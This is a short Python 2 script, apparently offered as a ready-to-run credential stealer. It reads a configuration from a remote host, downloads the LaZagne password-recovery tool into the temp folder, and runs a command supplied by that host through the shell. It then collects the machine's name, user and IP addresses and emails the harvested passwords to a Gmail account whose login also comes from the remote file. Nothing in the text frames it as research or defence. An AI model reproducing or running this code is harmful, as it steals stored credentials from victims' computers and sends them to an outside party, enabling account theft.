import subprocess
import smtplib
import requests
import re
import os
import tempfile
import platform
import getpass
import socket


Lazagne_link = 'http://dashfiles.ga/Server/lazagne_link.txt'

to_send = ''
sys_info = ''

def get_system_info():#defining function to geting system info.
	global log
	wan_ip =  get_wan_ip()  #getting wan ip
	local_ip = socket.gethostbyname(socket.gethostname())   #getting Lan ip
	uname = platform.uname()  
	computer_name = uname[1]
	user = getpass.getuser()
	total = platform.uname()

	sub_total = "OS =   \t\t" + uname[0] + ", " + uname[2] + ", " + "build = " + uname[3] + ", " + "Arch = " + uname[4]
	return sub_total + "\nPC Name =  " + computer_name + "\nUser = \t\t" + user + "\nRaw Details:" + str(total) + "\n" + "LAN IP =  " + local_ip + "\nWAN IP = " + wan_ip


def get_wan_ip():
	url = "https://api.ipify.org"
	theIP = requests.get(url).text
	return_value = theIP
	return return_value


def download_file(url):
    get_file = requests.get(url)
    file_n = url.split("/")[-1]
    with open(file_n, "wb") as downloaded_file:
        downloaded_file.write(get_file.content)
    return file_n


def send_email(email, password, message):   #defining function for sending emails.
	global sys_info
	message = "Subject: Run-Lazagne Report\n\n" + sys_info + "\n\nLogs:" + message   #arraging the massege to send
	email_server = smtplib.SMTP("smtp.gmail.com", 587)   #creating smtp object and spycifying gmail's smtp url and port
	email_server.starttls()  #enabling ssl connection
	email_server.login(email, password)   #logging into the server
	email_server.sendmail(email, email, message)  #sending the email with massage
	email_server.quit()   #quiting the connection





web_result = requests.get(Lazagne_link).text
req_data = re.findall("(?:#)(.*)(?:#)", web_result)

Lazagne_link_ = req_data[0]
Lazagne_cmd = req_data[1]
email_ = req_data[2]
password_ = req_data[3]


print Lazagne_link_

print Lazagne_cmd

print email_

print password_

temp = tempfile.gettempdir()
os.chdir(temp)


download_file(Lazagne_link_)

handle = subprocess.Popen(Lazagne_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

lazagne_error = handle.stderr.read()

lazagne_output = handle.stdout.read()

to_send = lazagne_output + '\n\n[-]Errors in executing:\n\n' + lazagne_error

sys_info = get_system_info()

send_email(email_, password_,to_send)